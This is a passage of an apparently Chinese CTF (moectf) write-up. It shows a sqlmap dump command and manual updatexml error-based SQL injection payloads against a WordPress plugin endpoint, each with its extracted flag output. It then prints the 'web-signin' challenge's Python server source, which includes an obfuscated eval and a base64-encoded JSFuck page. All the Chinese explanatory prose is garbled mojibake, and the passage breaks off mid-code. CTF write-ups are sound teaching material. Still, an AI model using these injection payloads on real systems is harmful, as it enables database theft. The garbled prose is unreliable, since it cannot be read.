stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php&quot;</span> <span class="hljs-attr">--data</span> <span class="hljs-string">&quot;time=1&quot;</span> -D wordpress -T secret_of_kokomi -C <span class="hljs-attribute">content</span> --dump<br></code></pre></td></tr></table></figure><p>â€“dump:å­˜å‚¨DBMSæ•°æ®åº“çš„è¡¨ä¸­çš„æ¡ç›®</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+----------------------------------------------------+</span><br><span class="hljs-section">| content                                            |</span><br><span class="hljs-section">+----------------------------------------------------+</span><br>| moectf&#123;Dig_Thr0ugh_Eve2y_C0de_3nd_Poss1bIlIti3s!!&#125; |<br>| paimengkanqilaihaohaochi                           |<br><span class="hljs-section">| woshishuimubushiyu~                                |</span><br><span class="hljs-section">+----------------------------------------------------+</span><br></code></pre></td></tr></table></figure><p><strong>æ‰‹æ³¨sql</strong></p><p>é€šè¿‡<a href="https://blog.csdn.net/m0_62092622/article/details/122721621">updatexml</a>å‡½æ•°æŸ¥è¯¢å…·ä½“çš„æ•°å€¼</p><p>æŸ¥è¯¢å½“å‰æ•°æ®åº“çš„æ‰€æœ‰è¡¨</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ip=<span class="hljs-number">1</span>&amp;user_agent=<span class="hljs-number">1</span>&amp;<span class="hljs-type">time</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br><br>//~secret_of_kokomi,visitor_record<br></code></pre></td></tr></table></figure><p>æŸ¥è¯¢secret_of_kokomiè¡¨çš„å­—æ®µ</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ip=<span class="hljs-number">1</span>&amp;user_agent=<span class="hljs-number">1</span>&amp;<span class="hljs-type">time</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;secret_of_kokomi&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br><br>//<span class="hljs-string">&#x27;~content,id~</span><br></code></pre></td></tr></table></figure><p>æŸ¥è¯¢æ•°æ®</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ip=<span class="hljs-number">1</span>&amp;user_agent=<span class="hljs-number">1</span>&amp;<span class="hljs-type">time</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,right(concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(content,<span class="hljs-number">0x7e</span>,id) <span class="hljs-keyword">from</span> secret_of_kokomi)),<span class="hljs-number">60</span>),<span class="hljs-number">1</span>)<br><br>//moectf&#123;Dig_Thr0ugh_Eve2y_C0de<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span>=<span class="hljs-number">1</span>&amp;user_agent=<span class="hljs-number">1</span>&amp;time=<span class="hljs-number">1</span> and updatexml(<span class="hljs-number">1</span>,right(concat(<span class="hljs-number">0</span>x7e,(select group_concat(content,<span class="hljs-number">0</span>x7e,id) from secret_of_kokomi)),<span class="hljs-number">30</span>),<span class="hljs-number">1</span>)<br><br><span class="hljs-attribute">y_C0de_3nd_Poss1bIlIti3s</span>!!&#125;<br></code></pre></td></tr></table></figure><p>å°†flagæ‹¼æ¥å³å¯</p><p>flag</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">moectf&#123;Dig_Thr0ugh_Eve2y_C0de_3nd_Poss1bIlIti3s!!&#125;<br></code></pre></td></tr></table></figure><h2 id="webâ€“signin"><a href="#webâ€“signin" class="headerlink" title="webâ€“signin"></a>webâ€“signin</h2><p>é¢˜ç›®ä¸­æœ‰ä¸€ä¸ªpythonæ–‡ä»¶,å…ˆä»£ç å®¡è®¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> users, salt<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> http.server<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    FLAG = f.read().strip()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gethash</span>(<span class="hljs-params">*items</span>):<br>    c = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        <span class="hljs-keyword">if</span> item <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">continue</span><br>        c ^= <span class="hljs-built_in">int</span>.from_bytes(hashlib.md5(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;salt&#125;</span>[<span class="hljs-subst">&#123;item&#125;</span>]<span class="hljs-subst">&#123;salt&#125;</span>&quot;</span>.encode()).digest(), <span class="hljs-string">&quot;big&quot;</span>) <span class="hljs-comment"># it looks so complex! but is it safe enough?</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:]<br><br><span class="hljs-keyword">assert</span> <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">in</span> users<br><span class="hljs-keyword">assert</span> users[<span class="hljs-string">&quot;admin&quot;</span>] == <span class="hljs-string">&quot;admin&quot;</span><br><br>hashed_users = <span class="hljs-built_in">dict</span>((k,gethash(k,v)) <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> users.items())<br><br><span class="hljs-built_in">eval</span>(<span class="hljs-built_in">int</span>.to_bytes(<span class="hljs-number">0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164</span>^<span class="hljs-number">8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153</span>,<span class="hljs-number">160</span>,<span class="hljs-string">&quot;big&quot;</span>,signed=<span class="hljs-literal">True</span>).decode().translate(&#123;<span class="hljs-built_in">ord</span>(c):<span class="hljs-literal">None</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;\x00&quot;</span>&#125;)) <span class="hljs-comment"># what is it?</span><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">data:<span class="hljs-built_in">str</span></span>):<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            data = base64.b64encode(data).decode() <span class="hljs-comment"># ummm...? It looks like it&#x27;s just base64 encoding it 5 times? truely?</span><br>        <span class="hljs-keyword">return</span> data<br><br>__page__ = base64.b64encode(<span class="hljs-string">&quot;PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5zaWduaW48L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoK3t9K1tdKVsrISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXVtbXV0rW10pWytbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoW10rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKVshK1tdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKShbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXSshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyhbXStbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKCFbXStbXSlbIStbXSshIVtdXSsoW10re30pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSkpWyErW10rISFbXSshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0pKCErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKChbXSt7fSlbK1tdXSlbK1tdXSsoIStbXSshIVtdKyEhW10rW10pKyhbXVtbXV0rW10pWyErW10rISFbXV0pKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXSt7fSlbKyEhW11dKygre30rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSkKICAgICAgICB2YXIgXzB4ZGI1ND1bJ3N0cmluZ2lmeScsJ2xvZycsJ3Bhc3N3b3JkJywnL2xvZ2luJywnUE9TVCcsJ2dldEVsZW1lbnRCeUlkJywndGhlbiddO3ZhciBfMHg0ZTVhPWZ1bmN0aW9uKF8weGRiNTRmYSxfMHg0ZTVhOTQpe18weGRiNTRmYT1fMHhkYjU0ZmEtMHgwO3ZhciBfMHg0ZDhhNDQ9XzB4ZGI1NFtfMHhkYjU0ZmFdO3JldHVybiBfMHg0ZDhhNDQ7fTt3aW5kb3dbJ2FwaV9iYXNlJ109Jyc7ZnVuY3Rpb24gbG9naW4oKXtjb25zb2xlW18weDRlNWEoJzB4MScpXSgnbG9naW4nKTt2YXIgXzB4NWYyYmViPWRvY3VtZW50W18weDRlNWEoJzB4NScpXSgndXNlcm5hbWUnKVsndmFsdWUnXTt2YXIgXzB4NGZkMjI2PWRvY3VtZW50W18weDRlNWEoJzB4NScpXShfMHg0ZTVhKCcweDInKSlbJ3ZhbHVlJ107dmFyIF8weDFjNjFkOT1KU09OW18weDRlNWEoJzB4MCcpXSh7J3VzZXJuYW1lJzpfMHg1ZjJiZWIsJ3Bhc3N3b3JkJzpfMHg0ZmQyMjZ9KTt2YXIgXzB4MTBiOThlPXsncGFyYW1zJzphdG9iKGF0b2IoYXRvYihhdG9iKGF0b2IoXzB4MWM2MWQ5KSkpKSl9O2ZldGNoKHdpbmRvd1snYXBpX2Jhc2UnXStfMHg0ZTVhKCcweDMnKSx7J21ldGhvZCc6XzB4NGU1YSgnMHg0JyksJ2JvZHknOkpTT05bXzB4NGU1YSgnMHgwJyldKF8weDEwYjk4ZSl9KVtfMHg0ZTVhKCcweDYnKV0oZnVuY3Rpb24oXzB4Mjk5ZDRkKXtjb25zb2xlW18weDRlNWEoJzB4MScpXShfMHgyOTlkNGQpO30pO30KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPmV6U2lnbmluPC9oMT4KICAgIDxwPlNpZ24gaW4gdG8geW91ciBhY2NvdW50PC9wPgogICAgPHA+ZGVmYXVsdCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgYWRtaW4gYWRtaW48L3A+CiAgICA8cD5Hb29kIEx1Y2shPC9wPgoKICAgIDxwPgogICAgICAgIHVzZXJuYW1lIDxpbnB1dCBpZD0idXNlcm5hbWUiPgogICAgPC9wPgogICAgPHA+CiAgICAgICAgcGFzc3dvcmQgPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPgogICAgPC9wPgogICAgPGJ1dHRvbiBpZCA9ICJsb2dpbiI+CiAgICAgICAgTG9naW4KICAgIDwvYnV0dG9uPgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBjb25zb2xlLmxvZygiaGVsbG8/IikKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgbG9naW4pOwo8L3NjcmlwdD4KPC9odG1sPg==&quot;</span>)<br>        <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandler</span>(http.server.BaseHTTPRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_GET</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> self.path == <span class="hljs-string">&quot;/&quot;</span>:<br>                self.send_response(<span class="hljs-number">200</span>)<br>                self.end_headers()<br>                self.wfile.write(__page__)<br>            <span class="hljs-keyword">else</span>:<br>                self.send_response(<span class="hljs-number">404</span>)<br>                self.end_headers()<br>                self.wfile.write(<span class="hljs-string">b&quot;404 Not Found&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            self.send_response(<span class="hljs-number">500</span>)<br>            self.end_headers()<br>            self.wfile.write(<span class="hljs-string">b&quot;500 Internal Server Error&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_POST</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> self.path == <span class="hljs-string">&quot;/login&quot;</span>:<br>                body = self.rfile.read(<span class="hljs-built_in">int</span>(self.headers.get(<span class="hljs-string">&quot;Content-Length&quot;</span>)))<br>                payload = json.loads(body)<br>                params = json.loads(decrypt(payload[<span class="hljs-string">&quot;params&quot;</span>]))<br>                <span class="hljs-built_in">print</span>(params)<br>                <span class="hljs-keyword">if</span> params.get(<span class="hljs-string">&quot;username&quot;</span>) == <span class="hljs-string">&quot;admin&quot;</span>:<br>                    self.send_response(<span class="hljs-number">403</span>)<br>                    self.end_headers()<br>                    self.wfile.write(<span class="hljs-string">b&quot;YOU CANNOT LOGIN AS ADMIN!&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;admin&quot;</span>)<br>                    <span class="hljs-keyword">return</span><br>                <span class="hljs-keyword">if</span> params.get(<span class="hljs-string">&quot;username&quot;</span>) == params.get(<span class="hljs-string">&quot;password&quot;</span>):<br>                    self.send_response(<span class="hljs-number">403</span>)<br>                    self.end_headers()<br>                    self.wfile.write(<span class="hljs-string">b&quot;YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;same&quot;</span>)<br>                    <span class="hljs-keyword">return</span><br>                hashed = gethash(params.get(<span class="hljs-string">&quot;username&quot;</span>),params.get(<span class="hljs-string">&quot;password&quot;</span>))<br>                <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> hashed_users.items():<br>                    <span class="hljs-keyword">if</span> hashed == v:<br>                        data = &#123;<br>                            <span class="hljs-string">&quot;user&quot;</span>:k,<br>                            <span class="hljs-string">&quot;hash&quot;</span>:hashed,<br>                            <span class="hljs-string">&quot;flag&quot;</span>: FLAG <span class="hljs-keyword">if</span> k == <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;</span><br>                        &#125;<br>                        self.send_response(<span class="hljs-number">200</span>)<br>                        self.end_headers()<br>                        self.wfile.write(json.dumps(data).encode())<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;success&quot;</span>)<br>                        <span class="hljs-keyword">return</span><br>                self.send_response(<span class="hljs-number">403</span>)<br>                self.end_headers()<br>                self.wfile.write(<span class="hljs-string">b&quot;Invalid username or password&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                self.send_response(<span class="hljs-number">404</span>)<br>                self.end_headers()<br>                self.wfile.write(<span class="hljs-string">b&quot;404 Not Found&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            self.send_response(<span class="hljs-number">500</span>)<br>            self.end_headers()<br>            self.wfile.write(<span class="hljs-string">b&quot;500 Internal Server Error&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    server = http.server.HTTPServer((<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">9999</span>), MyHandler)<br>    server.serve_forever()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">gethash</span>(<span class="hljs-params">*items</span>):<br>    c = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        <span class="hljs-keyword">if</span> item <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">continue</span><br>        c ^= <span class="hljs-built_in">int</span>.from_bytes(hashlib.md5(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;salt&#125;</span>[<span class="hljs-subst">&#123;item&#125;</span>]<span class="hljs-subst">&#123;salt&#125;</span>&quot;</span>.encode()).digest(), <span class="hljs-string">&quot;big&quot;</span>) <span class="hljs-comment"># it looks so complex! but is it safe enough?</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:]<br></code></pre></td></tr></table></figure><ul><li>^:æŒ‰ä½å¼‚æˆ–è¿ç®—ç¬¦ï¼šå½“ä¸¤å¯¹åº”çš„äºŒè¿›ä½ç›¸å¼‚æ—¶ï¼Œç»“æœä¸º1</li><li><a href="https://blog.csdn.net/Clovera/article/details/79293108">int.from_bytes()</a>: res &#x3D; int.from_bytes(x)çš„å«ä¹‰æ˜¯æŠŠbytesç±»å‹çš„å˜é‡xï¼Œè½¬åŒ–ä¸ºåè¿›åˆ¶æ•´æ•°ï¼Œå¹¶å­˜å…¥resä¸­ã€‚</li><li>hashlib.md5()ï¼šå“ˆå¸ŒMD5åŠ å¯†</li><li>hex(c)[2:]:è½¬æ¢ä¸º16è¿›åˆ¶[2:]ä»ç¬¬äºŒä½æ•°å¼€å§‹è¯»èµ·</li></ul><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">def</span> decrypt(<span class="hljs-class"><span class="hljs-keyword">data</span>:str):</span><br>        for x <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):<br>            <span class="hljs-class"><span class="hljs-keyword">data</span> = base64.b64encode(<span class="hljs-title">data</span>).decode() # ummm...? <span class="hljs-type">It</span> looks like it&#x27;s just base64 encoding it 5 times? truely?</span><br>        return <span class="hljs-class"><span class="hljs-keyword">data</span></span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œdata base64åŠ å¯†äº†5æ¬¡ï¼Œæ‰€ä»¥æŠ“åŒ…åˆ°çš„paramsè¦è¿›è¡Œ5æ¬¡base64è§£ç </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hashed = <span class="hljs-built_in">gethash</span>(params<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&quot;username&quot;</span>),params<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&quot;password&quot;</span>))<br>                <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> hashed_users<span class="hljs-selector-class">.items</span>():<br>                    <span class="hljs-keyword">if</span> hashed == v:<br>                        data = &#123;<br>                            <span class="hljs-string">&quot;user&quot;</span>:k,<br>                            <span class="hljs-string">&quot;hash&quot;</span>:hashed,<br>                            <span class="hljs-string">&quot;flag&quot;</span>: FLAG <span class="hljs-keyword">if</span> k == <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">else</span> <span 